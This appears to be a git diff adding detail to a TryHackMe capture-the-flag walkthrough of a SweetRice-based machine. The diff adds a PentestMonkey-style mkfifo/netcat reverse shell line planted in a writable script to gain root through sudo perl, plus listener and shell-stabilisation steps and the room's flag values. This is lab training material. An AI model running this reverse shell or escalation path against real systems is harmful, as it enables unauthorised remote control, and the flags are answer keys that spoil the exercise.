@@ -51,6 +51,11 @@ Command:
 searchsploit SweetRice
 ```
 
+Command: to see more info or *examine* an exploit
+```bash
+searchsploit -x /path/to/exploit.html
+```
+
 this exploit is uploadable and offers a login page:
 ```
 SweetRice 1.5.1 - Cross-Site Request Forgery
@@ -100,9 +105,18 @@ Visit `http://$IP/content/inc/ads/revshell.php` to spawn shell
 
 ### Upgrading to a tty shell
 
-Command: uses `script`, so no need for Python
+Command: uses `/usr/bin/script`, so no need for Python
 ```bash
 /usr/bin/script -qc /bin/bash /dev/null
+```
+
+To stabilize shell: (type carefully, beware of typos)
+```bash
+<Ctrl><Z>
+stty raw -echo
+<F><G>
+nc -lnvp 8888
+export TERM=xterm
 ```
 
 **User Flag Found**: `THM{63e5bce9271952aad1113b6f1ac28a07}`
@@ -110,8 +124,46 @@ Command: uses `script`, so no need for Python
 
 ## PrivEsc
 
+Searching for files with SUID privilege shows `/usr/bin/perl /home/itguy/backup.pl`
 
-**Root flag**: `THM{6637f41d0177b6f37cb20d775124699f}`
+It is not writeable, but it calls on `/etc/copy.sh` which is writeable
+
+so edit it with nano and add: learned from -- [PentestMonkey cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 7777 >/tmp/f
+```
+
+Remember to change `$IP` and **new** listening `$port`.
+
+then starting the **new** netcat listening port:
+```bash
+nc -lnvp 7777
+```
+
+On Target Machine:
+```bash
+sudo -l
+sudo /usr/bin/perl /home/itguy/backup.pl
+```
+
+Root access shell achieved
+
+To stabilize shell: (type carefully, beware of typos)
+```bash
+<Ctrl><z>
+stty raw -echo
+<f><g>
+nc -lnvp 7777
+export TERM=xterm
+```
+
+TTY upgrade:
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+
+**Root Flag Found**: `THM{6637f41d0177b6f37cb20d775124699f}`
 
 ---
 [back to TryHackMe main page](thm.md)
